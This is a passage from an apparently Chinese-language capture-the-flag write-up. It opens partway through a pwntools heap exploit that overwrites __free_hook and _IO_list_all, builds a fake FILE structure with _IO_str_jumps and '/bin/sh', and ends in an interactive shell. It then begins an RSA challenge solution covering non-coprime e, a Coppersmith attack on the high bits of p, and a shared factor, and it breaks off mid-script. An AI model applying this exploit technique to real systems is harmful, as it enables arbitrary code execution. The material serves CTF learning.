</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1555555071e0</span> <span class=o>-</span> <span class=mh>0x15555531a000</span> <span class=o>+</span> <span class=n>libc</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>__free_hook</span> <span class=o>-</span> <span class=mh>0x20</span> <span class=o>-</span> <span class=mh>0x8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;&gt; </span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;(edit):</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;Apple&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;idx:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=mi>2</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Do~</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Re~</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Mi~</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Fa~</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=s2>&#34;Cherry&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=s2>&#34;Banana&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1555555071e0</span> <span class=o>-</span> <span class=mh>0x15555531a000</span> <span class=o>+</span> <span class=n>libc</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap</span> <span class=o>+</span> <span class=mh>0x1f70</span><span class=p>)</span> <span class=o>*</span> <span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap</span> <span class=o>+</span> <span class=mh>0xf50</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1555555071e0</span> <span class=o>-</span> <span class=mh>0x15555531a000</span> <span class=o>+</span> <span class=n>libc</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap</span> <span class=o>+</span> <span class=mh>0xf50</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;&gt; </span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;(edit):</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;Apple&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;idx:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=mi>2</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Do~</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Re~</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Mi~</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Fa~</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=s2>&#34;Banana&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=s2>&#34;Apple&#34;</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=s2>&#34;Apple&#34;</span><span class=p>,</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=s2>&#34;Cherry&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=s2>&#34;Banana&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1555555071e0</span> <span class=o>-</span> <span class=mh>0x15555531a000</span> <span class=o>+</span> <span class=n>libc</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>_IO_list_all</span> <span class=o>-</span> <span class=mh>0x20</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;&gt; </span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;(edit):</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;Apple&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;idx:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=mi>2</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Do~</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Re~</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Mi~</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Fa~</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=s2>&#34;Cherry&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=s2>&#34;Banana&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1555555071e0</span> <span class=o>-</span> <span class=mh>0x15555531a000</span> <span class=o>+</span> <span class=n>libc</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap</span> <span class=o>+</span> <span class=mh>0x1f70</span><span class=p>)</span> <span class=o>*</span> <span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap</span> <span class=o>+</span> <span class=mh>0xf50</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1555555071e0</span> <span class=o>-</span> <span class=mh>0x15555531a000</span> <span class=o>+</span> <span class=n>libc</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap</span> <span class=o>+</span> <span class=mh>0xf50</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;&gt; </span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;(edit):</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;Apple&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;idx:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=mi>2</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Do~</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Re~</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Mi~</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Fa~</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=s2>&#34;Banana&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=s2>&#34;Apple&#34;</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=s2>&#34;Durian&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>delete</span><span class=p>(</span><span class=s2>&#34;Durian&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=s2>&#34;Apple&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=s2>&#34;Durian&#34;</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=s2>&#34;Banana&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=s2>&#34;Banana&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=s2>&#34;Apple&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=s2>&#34;Durian&#34;</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=s2>&#34;Apple&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=s2>&#34;Banana&#34;</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=s2>&#34;Cherry&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=s2>&#34;Apple&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=s2>&#34;Banana&#34;</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=s2>&#34;Cherry&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=s2>&#34;Banana&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap</span> <span class=o>+</span> <span class=mh>0x7930</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>__free_hook</span> <span class=o>-</span> <span class=mh>0x20</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=s2>&#34;Durian&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>3</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x56</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#0x38</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap</span> <span class=o>+</span> <span class=mh>0xfa0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap</span> <span class=o>+</span> <span class=mh>0xfa0</span> <span class=o>+</span> <span class=mh>0x53</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#0x38  _IO_buf_base</span>
</span></span><span class=line><span class=cl><span class=c1>#0x40  _IO_buf_end</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x40</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;/bin/sh</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=o>+</span>  <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span> <span class=o>+</span> <span class=mh>0x52290</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xc8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>_IO_str_jumps</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=s2>&#34;Banana&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#_IO_cleanup</span>
</span></span><span class=line><span class=cl><span class=c1>#_IO_flush_all_lockp</span>
</span></span><span class=line><span class=cl><span class=c1>#_IO_str_overflow</span>
</span></span><span class=line><span class=cl><span class=c1>#_IO_str_overflow + 120</span>
</span></span><span class=line><span class=cl><span class=c1># gdb.attach(r, &#34;b *(_IO_str_overflow + 120)&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># sleep(1)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;&gt; </span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;quit&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=crypto>crypto</h2><h3 id=easy_rsa>easy_rsa</h3><p>flag分成三部分了，第一部分e和phi不互素，所以求一下gcd(e,phi)，再解就行；</p><p>第二部分一元copper的p高位攻击，恢复p再求q；</p><p>第三部分c和n公因数就是p，直接求公因数解。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>gmpy2</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=err>​</span>
</span></span><span class=line><span class=cl><span class=n>dic1</span> <span class=o>=</span>  <span class=p>{</span><span class=s1>&#39;c&#39;</span><span class=p>:</span> <span class=s1>&#39;27455f081e4858790c6503580dad3302ae359c9fb46dc601eee98f05142128404e95377324720adbbdebf428549008bcd1b670f6749592a171b30316ab707004b9999f3b80de32843afdfd30505b1f4166a03cee9fc48902b74b6e850cfd268e6917c5d84e64f7e7cd0e4a30bfe5903fb5d821d27fdc817d9c4536a8e7aea55af266abcae857a8ffff2f741901baba1b44091a137c69c471c123ab0b80e250e055959c468e6e37c005105ecd7c8b48c659024e5e251df3eeff5da7b3d561cd98150da3575a16bee5f2524d2795fd4879487018345c1e96efc085ed45fb5f02c027aee5bca3aad0eb3e23376c0cd18b02fb05a1ff8fb1af0a3ce4bb671599894e&#39;</span><span class=p>,</span> <span class=s1>&#39;p&#39;</span><span class=p>:</span> <span class=s1>&#39;bb602e402b68a5cfcc5cfcc63cc82e362e98cb7043817e3421599a4bb8755777c362813742852dad4fec7ec33f1faec04926f0c253f56ab4c4dde6d71627fbc9ef42425b70e5ecd55314e744aa66653103b7d1ba86d1e0e21920a0bfe7d598bd09c3c377a3268928b953005450857c6cfea5bfdd7c16305baed0f0a31ad688bd&#39;</span><span class=p>,</span> <span class=s1>&#39;q&#39;</span><span class=p>:</span> <span class=s1>&#39;bb8d1ea24a3462ae6ec28e79f96a95770d726144afc95ffffa19c7c3a3786a6acc3309820ba7b1a28a4f111082e69e558b27405613e115139b38e799c723ab7fdd7be14b330b118ae60e3b44483a4c94a556e810ab94bbb102286d0100d7c20e7494e20e0c1030e016603bd2a06c1f6e92998ab68e2d420faf47f3ee687fb6d1&#39;</span><span class=p>,</span> <span class=s1>&#39;e&#39;</span><span class=p>:</span> <span class=s1>&#39;292&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>dic2</span> <span class=o>=</span>  <span class=p>{</span><span class=s1>&#39;c&#39;</span><span class=p>:</span> <span class=s1>&#39;3a80caebcee814e74a9d3d81b08b1130bed6edde2c0161799e1116ab837424fbc1a234b9765edfc47a9d634e1868105d4458c9b9a0d399b870adbaa2337ac62940ade08daa8a7492cdedf854d4d3a05705db3651211a1ec623a10bd60596e891ccc7b9364fbf2e306404aa2392f5598694dec0b8f7efc66e94e3f8a6f372d833941a2235ebf2fc77c163abcac274836380045b63cc9904d9b13c0935040eda6462b99dd01e8230fdfe2871124306e7bca5b356d16796351db37ec4e574137c926a4e07a2bfe76b9cbbfa4b5b010d678804df3e2f23b4ec42b8c8433fa4811bf1dc231855bea4225683529fad54a9b539fe824931b4fdafab67034e57338217f&#39;</span><span class=p>,</span> <span class=s1>&#39;p&#39;</span><span class=p>:</span> <span class=s1>&#39;a9cb9e2eb43f17ad6734356db18ad744600d0c19449fc62b25db7291f24c480217d60a7f87252d890b97a38cc6943740ac344233446eea4084c1ba7ea5b7cf2399d42650b2a3f0302bab81295abfd7cacf248de62d3c63482c5ea8ab6b25cdbebc83eae855c1d07a8cf0408c2b721e43c4ac53262bf9aaf7a000000000000000&#39;</span><span class=p>,</span> <span class=s1>&#39;e&#39;</span><span class=p>:</span> <span class=s1>&#39;10001&#39;</span><span class=p>,</span> <span class=s1>&#39;n&#39;</span><span class=p>:</span> <span class=s1>&#39;841a5a012c104e600eca17b451d5fd37c063ad347707a2e88f36a07e9ad4687302790466e99f35b11580cbe8b0a212e6709686c464a6393c5895b1f97885f23ea12d2069eb6dc3cb4199fb8c6e80a4a94561c6c3499c3c02d9dc9cf216c0f44dc91701a6d9ec89981f261a139500420a51014492f1da588a26e761439dd5739b32540ca6dc1ec3b035043bc535304a06ccb489f72fcd1aa856e1cffe195039176937f9a16bd19030d1e00095f1fd977cf4f23e47b55650ca4712d1eb089d92df032e5180d05311c938a44decc6070cd01af4c6144cdab2526e5cb919a1828bec6a4f3332bf1fa4f1c9d3516fbb158fd4fbcf8b0e67eff944efa97f5b24f9aa65&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>dic3</span> <span class=o>=</span>  <span class=p>{</span><span class=s1>&#39;c&#39;</span><span class=p>:</span> <span class=s1>&#39;1bd2a47a5d275ba6356e1e2bd10d6c870693be540e9318c746e807a7672f3a75cc63841170126d7dba52d7f6f9cf0f8dce9705fc1785cc670b2658b05d4b24d8918f95594844bfa920c8ffe73160c2c313b3fdbc4541ec19828165e34afa7d05271cc6fd59d08138b88c11677e6ac3b39cff525dcb19694b0388d895f53805a5e5bd8cfb947080e4855aaf83ebd85a397526f7d76d26031386900cb44a2e4bd121412bcee7a6c1e9af411e234f130e68a428596265d3ec647e50f65cb81393f4bd38389a2b9010fd715582506b9054dc235aced50757462b77a5606f116853af0c1ea3c7cf0d304f885d86081f8bac8b67b0625122f75448c5b6eb8f1cc8a0df&#39;</span><span class=p>,</span> <span class=s1>&#39;n&#39;</span><span class=p>:</span> <span class=s1>&#39;c2b17c86a8950f6dafe0a633890e4271cfb20c5ffda2d6b3d035afa655ed05ec16c67b18832ed887f2cea83056af079cc75c2ce43c90cce3ed02c2e07d256f240344f1734adeee6dc2b3b4bbf6dcfc68518d0a74e3e66f1865db95ef4204457e6471903c2321ac97f3b8e3d8d935896e9fc9145a30a3e24e7c320490a9944c1e94d301c8388445532699e6189f4aa6a86f67f1d9b8fb0de4225e005bd27594cd33e36622b2cd8eb2781f0c24d33267d9f29309158942b681aab81f39d1b4a73bd17431b46a89a0e4c2c58b1e24e850355c63b72392600d3fff7a16f6ef80ea515709da3ef1d28782882b0dd2f76bf609590db31979c5d1fd03f75d9d8f1c5069&#39;</span><span class=p>,</span> <span class=s1>&#39;e&#39;</span><span class=p>:</span> <span class=s1>&#39;10001&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>e1</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>dic1</span><span class=p>[</span><span class=s1>&#39;e&#39;</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>c1</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>dic1</span><span class=p>[</span><span class=s1>&#39;c&#39;</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p1</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>dic1</span><span class=p>[</span><span class=s1>&#39;p&#39;</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>q1</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>dic1</span><span class=p>[</span><span class=s1>&#39;q&#39;</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span>
